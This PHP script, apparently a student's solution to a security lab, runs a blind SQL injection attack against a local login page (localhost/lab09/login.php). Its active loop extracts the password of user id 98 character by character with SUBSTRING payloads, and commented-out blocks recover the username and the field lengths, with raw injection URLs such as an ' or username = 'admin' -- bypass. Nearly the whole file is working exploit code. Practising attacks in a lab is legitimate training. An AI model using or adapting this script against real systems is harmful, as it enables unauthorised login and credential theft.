<?php
//$url="http://localhost/lab09/login.php?u=\"%20or%20username%20=%20%27admin%27%20--%20";
//$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%20and%20SUBSTRING(username,1,1)%20=%20%27a%27%20--%20"; // Celui fonctionne
//$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%20AND%20SUBSTRING(password,1,1)%20=%20%271%27%20--%20"




//Cette partie est pour l'username "brute force"
/*
for ($i = 1; $i <= 5; $i++) {
    foreach (range('a', 'z') as $letter){
         //echo "$letter \n";
    	$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%20and%20SUBSTRING(username,$i,1)%20=%20%27$letter%27%20--%20";
		$result = file_get_contents($url);
		if (strpos($result, 'cat') !== false) {
			echo "\n";
			print "$letter";
			break;
		}else{
			
		}
	}   
}
*/


/*$sizepwd = 0;
while ($sizepwd < 25)
{
    $url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%20and%20length(password)%20=%20$sizepwd--%20";
	$result = file_get_contents($url);
	if (strpos($result, 'cat') !== false) {
		echo "\n";
		
		break;
	}else{
		//echo "\n";
		//echo "nope";
	}

	$sizepwd++;
}

echo 'sizepwd is ';
print $sizepwd;*/


for ($i = 1; $i <= 8; $i++) {
    foreach (range(0, 9) as $letter){
         //echo "$letter \n";
    	$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%20and%20SUBSTRING(password,$i,1)%20=%20%27$letter%27%20--%20";
		$result = file_get_contents($url);
		if (strpos($result, 'cat') !== false) {
			echo "\n";
			print "$letter";
			break;
		}else{
			
		}
	}   
}


/*Ceci marche
$size = 0;
while ($size < 25)
{
    $url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%20and%20length(username)%20=%20$size--%20";
	$result = file_get_contents($url);
	if (strpos($result, 'cat') !== false) {
		echo "\n";
		
		break;
	}else{
		//echo "\n";
		//echo "nope";
	}

	$size++;
}

echo 'size is ';
print $size;

for ($i = 1; $i <= $size; $i++) {
    echo "The number is: $i <br>";
} 
*/









/*$result = file_get_contents($url);

print($result);


if (strpos($result, 'cat') !== false) {
	echo "\n";
	echo 'true';
}else{
	echo "\n";
	echo "nope";
}*/

echo "\n";

?>